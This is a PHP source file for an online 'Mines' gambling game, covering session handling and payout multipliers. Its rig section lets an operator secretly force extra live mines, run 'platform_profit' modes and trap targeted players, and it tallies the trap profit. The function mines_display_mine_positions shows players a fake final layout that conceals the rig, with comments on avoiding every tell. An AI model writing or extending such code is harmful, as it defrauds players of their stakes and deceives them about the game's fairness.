<?php
/**
 * Mines — 25-tile board, one live game per player.
 *
 * The only structural change is where a session lives. server.js kept boards in the
 * MINES_USER_SESSIONS object, so a process restart wiped every board in flight; here they are rows
 * in MinesSession, which means they survive. That is strictly better and is the one difference.
 *
 * The important guard is preserved exactly. server.js claims the player's single session slot
 * SYNCHRONOUSLY, before its first await, because testing showed twelve simultaneous starts were all
 * accepted and all twelve stakes taken for one board: every request read the map, saw no active
 * session, and only then hit the wallet debit. Here the claim is an INSERT against a UNIQUE index
 * on username — a colliding insert is the exact equivalent of finding a session already present,
 * and it holds across processes, which the in-memory map never did.
 */

require_once __DIR__ . '/../lib/db.php';
require_once __DIR__ . '/../lib/helpers.php';

/**
 * The multiplier paid for clearing the ENTIRE board at a given mine count — the operator's table,
 * used verbatim rather than derived.
 *
 * It replaces the previous inverse-probability formula, which was mathematically fair but paid out
 * far too steeply at the top of the range: 24 mines returned 24.25x where this table pays 5.00x.
 */
function mines_max_multiplier($minesCount) {
    static $table = [
        1  => 1.02, 2  => 1.08, 3  => 1.16, 4  => 1.25, 5  => 1.34, 6  => 1.44,
        7  => 1.55, 8  => 1.66, 9  => 1.78, 10 => 1.91, 11 => 2.05, 12 => 2.19,
        13 => 2.35, 14 => 2.51, 15 => 2.69, 16 => 2.87, 17 => 3.07, 18 => 3.27,
        19 => 3.49, 20 => 3.71, 21 => 3.95, 22 => 4.20, 23 => 4.50, 24 => 5.00,
    ];
    $n = (int) $minesCount;
    if (isset($table[$n])) return $table[$n];
    // Outside 1-24 the round could not have been started (/api/mines/start enforces the range);
    // clamp rather than return null so a bad stored session can never produce a null payout.
    if ($n < 1)  return $table[1];
    return $table[24];
}

/**
 * The multiplier after N safe reveals.
 *
 * The table above is the payout for clearing the whole board; a partially-cleared board earns a
 * proportional share of it. So with 3 mines (22 safe tiles, 1.16x for the lot): 11 gems pays
 * 1.08x, all 22 pays the full 1.16x. At 24 mines there is a single safe tile, so opening it pays
 * the whole 5.00x.
 *
 * Signature is unchanged, so every existing caller keeps working.
 */
function calculate_mines_multiplier($gridSize, $minesCount, $revealedCount) {
    if ($revealedCount <= 0) return 1.0;
    $safeTiles = $gridSize - $minesCount;
    if ($safeTiles <= 0) return 0.0;
    if ($revealedCount > $safeTiles) $revealedCount = $safeTiles;

    $target = mines_max_multiplier($minesCount);
    return to_fixed_num(1.0 + ($target - 1.0) * ($revealedCount / $safeTiles), 2);
}

// -------------------------------------------------------------------------------------------------
// Sessions
// -------------------------------------------------------------------------------------------------

function mines_session_get($username) {
    $r = one('SELECT * FROM "MinesSession" WHERE LOWER("username") = LOWER(?) LIMIT 1', [$username]);
    if (!$r) return null;
    return [
        'id'               => (int)$r['id'],
        'username'         => $r['username'],
        'status'           => $r['status'],
        'bet_amount'       => (float)$r['bet_amount'],
        'mines_count'      => (int)$r['mines_count'],
        'server_seed'      => $r['server_seed'],
        'seed_hash'        => $r['seed_hash'],
        'mine_positions'   => $r['mine_positions'] === null ? [] : (json_decode($r['mine_positions'], true) ?: []),
        'revealed'         => $r['revealed'] === null ? [] : (json_decode($r['revealed'], true) ?: []),
        'multiplier'       => (float)$r['multiplier'],
        'potential_payout' => (float)$r['potential_payout'],
    ];
}

/** Every live session, for the operator's active-users view and the mass trap. */
function mines_sessions_all() {
    $rows = all('SELECT * FROM "MinesSession"');
    $out = [];
    foreach ($rows as $r) {
        $out[$r['username']] = [
            'username'         => $r['username'],
            'status'           => $r['status'],
            'bet_amount'       => (float)$r['bet_amount'],
            'mines_count'      => (int)$r['mines_count'],
            'server_seed'      => $r['server_seed'],
            'seed_hash'        => $r['seed_hash'],
            'mine_positions'   => $r['mine_positions'] === null ? [] : (json_decode($r['mine_positions'], true) ?: []),
            'revealed'         => $r['revealed'] === null ? [] : (json_decode($r['revealed'], true) ?: []),
            'multiplier'       => (float)$r['multiplier'],
            'potential_payout' => (float)$r['potential_payout'],
        ];
    }
    return $out;
}

/**
 * Claim the player's single session slot.
 *
 * Returns true when the claim succeeded and false when a round is already in progress. The INSERT
 * either wins the unique index or it does not; there is no read-then-write window for a
 * double-clicked Start to slip through.
 */
function mines_session_claim($username) {
    try {
        q('INSERT INTO "MinesSession" ("username","status","bet_amount","mines_count","multiplier","potential_payout")
           VALUES (?, ?, 0, 3, 1, 0)', [$username, 'starting']);
        return true;
    } catch (Throwable $e) {
        // Duplicate key: a session row already exists. Whether it BLOCKS the new round depends on
        // its status — a finished board ('busted'/'cashed') is replaced, exactly as the original
        // overwrote a stale entry in its map.
        $existing = mines_session_get($username);
        if ($existing && ($existing['status'] === 'active' || $existing['status'] === 'starting')) {
            return false;
        }
        $n = affected("UPDATE \"MinesSession\"
                       SET \"status\" = 'starting', \"bet_amount\" = 0, \"mines_count\" = 3, \"server_seed\" = NULL,
                           \"seed_hash\" = NULL, \"mine_positions\" = NULL, \"revealed\" = NULL,
                           \"multiplier\" = 1, \"potential_payout\" = 0
                       WHERE LOWER(\"username\") = LOWER(?) AND \"status\" IN ('busted','cashed')", [$username]);
        return $n > 0;
    }
}

/** Release a claim that never became a real round, so the player is not locked out. */
function mines_session_release($username) {
    try {
        q("DELETE FROM \"MinesSession\" WHERE LOWER(\"username\") = LOWER(?) AND \"status\" = 'starting'", [$username]);
    } catch (Throwable $e) { /* best effort */ }
}

function mines_session_write($username, array $s) {
    q('UPDATE "MinesSession"
       SET "status" = ?, "bet_amount" = ?, "mines_count" = ?, "server_seed" = ?, "seed_hash" = ?,
           "mine_positions" = ?, "revealed" = ?, "multiplier" = ?, "potential_payout" = ?
       WHERE LOWER("username") = LOWER(?)', [
        $s['status'], $s['bet_amount'], $s['mines_count'], $s['server_seed'], $s['seed_hash'],
        js_json_encode(array_values($s['mine_positions'])), js_json_encode(array_values($s['revealed'])),
        $s['multiplier'], $s['potential_payout'], $username,
    ]);
}

/**
 * Flip a session's status only if it currently holds the expected one.
 *
 * The PHP equivalent of `session.status = 'cashed'` happening before any await: two cash-out
 * requests racing each other cannot both see an 'active' session and both get paid.
 */
function mines_session_claim_status($username, $from, $to) {
    return affected('UPDATE "MinesSession" SET "status" = ? WHERE LOWER("username") = LOWER(?) AND "status" = ?',
                    [$to, $username, $from]) > 0;
}

// -------------------------------------------------------------------------------------------------
// Rig configuration
// -------------------------------------------------------------------------------------------------

function mines_rig_default() {
    return [
        'matrix'       => array_fill(0, 25, 'auto'),  // 'auto', 'safe', 'mine'
        'next_tile'    => null,                        // null, 'gem', 'mine'
        'rig_type'     => '',                          // '', 'guarantee_win', 'platform_profit'
        'target_users' => [],                          // targeted usernames for simultaneous traps
    ];
}

function mines_rig_get() {
    try { $stored = state_get('mines_rig_config'); } catch (Throwable $e) { $stored = null; }
    if (!is_array($stored)) return mines_rig_default();
    return array_merge(mines_rig_default(), $stored);
}

function mines_rig_set($config) {
    state_set('mines_rig_config', $config);
    return $config;
}

/** Replaces the MINES_TOTAL_TRAP_PROFIT module variable. */
function mines_trap_profit_get() {
    try { $rec = state_get('mines_total_trap_profit'); } catch (Throwable $e) { $rec = null; }
    return is_array($rec) ? (float)($rec['total'] ?? 0) : 0.0;
}

function mines_trap_profit_add($amount) {
    $total = mines_trap_profit_get() + (float)$amount;
    try { state_set('mines_total_trap_profit', ['total' => $total]); } catch (Throwable $e) {}
    return $total;
}

/**
 * The mine layout the PLAYER is shown once a round is over — deliberately not the real one.
 *
 * The admin rig can force far more live mines than the player chose to play against: a board set
 * to 20 mines against a player who picked 3 really does have 20 live mines, and the player really
 * does bust on any of them. Revealing that layout at the end, however, showed the player 20 bombs
 * on a board they had configured for 3, which exposes the rig outright.
 *
 * This returns a display-only layout of exactly `mines_count` tiles — what the player asked for —
 * drawn from the mines that are actually live. Every other tile, including the live mines left out
 * of the selection, is presented as an ordinary gem by the client. Gameplay is untouched: the real
 * `mine_positions` stay authoritative for busting, multipliers and payouts.
 *
 * Three properties this must hold, each of which would otherwise be a visible tell:
 *
 *   1. `$hitTile` (the tile that just busted the round) is ALWAYS included. Showing "you hit a
 *      mine" and then drawing a gem on the tile they clicked is worse than showing the real
 *      layout.
 *   2. Tiles the player already opened as gems are never selected — a tile that showed a gem
 *      during play must not flip to a bomb at the end.
 *   3. The SAME round must always produce the SAME layout. The selection is therefore derived
 *      deterministically from the round's own server_seed rather than drawn at random per call.
 *      A random draw would change the layout every time the player reloaded the finished board —
 *      and worse, reloading repeatedly would union those different draws into the real mine set,
 *      handing back exactly the information this is hiding.
 *
 * On a busted round the tile that busted it is kept as the FIRST entry of `mine_positions`, which
 * is how it stays recoverable after a reload: the set is unchanged (the audit trail is intact,
 * membership tests are order-independent) and only its order carries the extra fact. That avoids
 * needing a schema change purely to remember one integer.
 *
 * If the rig leaves fewer live mines than the player selected (admin forced tiles 'safe'), the
 * selection is topped up from unopened tiles so the count the player sees always matches the count
 * they chose.
 */
function mines_display_mine_positions(array $session, $hitTile = null) {
    $gridSize = 25;
    $want     = max(0, (int) ($session['mines_count'] ?? 3));
    $real     = array_values(array_unique(array_map('intval', $session['mine_positions'] ?? [])));
    $revealed = array_values(array_unique(array_map('intval', $session['revealed'] ?? [])));
    $seed     = (string) ($session['server_seed'] ?? '');

    // A busted round with no explicit hit tile is being re-rendered after a reload: recover it from
    // the head of mine_positions, where the bust path put it.
    if ($hitTile === null && ($session['status'] ?? '') === 'busted' && count($real) > 0) {
        $hitTile = $real[0];
    }

    $chosen = [];

    // 1. The busting tile always shows as a mine.
    if ($hitTile !== null && $hitTile >= 0 && $hitTile < $gridSize) {
        $chosen[] = (int) $hitTile;
    }

    // Deterministic, side-effect-free ordering. Explicitly NOT shuffle()/mt_srand(): seeding the
    // global RNG would perturb every other random draw in the same request (rig decisions, filler
    // names), and an unseeded shuffle would not survive a reload.
    $order = function (array $list) use ($seed) {
        usort($list, function ($a, $b) use ($seed) {
            return strcmp(md5($seed . ':' . $a), md5($seed . ':' . $b));
        });
        return $list;
    };

    // 2. Fill from the genuinely live mines, minus anything already opened as a gem.
    $candidates = array_values(array_filter($real, function ($p) use ($revealed, $chosen) {
        return !in_array($p, $revealed, true) && !in_array($p, $chosen, true);
    }));
    foreach ($order($candidates) as $p) {
        if (count($chosen) >= $want) break;
        $chosen[] = (int) $p;
    }

    // 3. Top up from unopened tiles if the rig left fewer live mines than the player chose, so the
    //    displayed count always equals mines_count.
    if (count($chosen) < $want) {
        $filler = [];
        for ($i = 0; $i < $gridSize; $i++) {
            if (in_array($i, $revealed, true) || in_array($i, $chosen, true)) continue;
            $filler[] = $i;
        }
        foreach ($order($filler) as $p) {
            if (count($chosen) >= $want) break;
            $chosen[] = (int) $p;
        }
    }

    sort($chosen);
    return array_values($chosen);
}
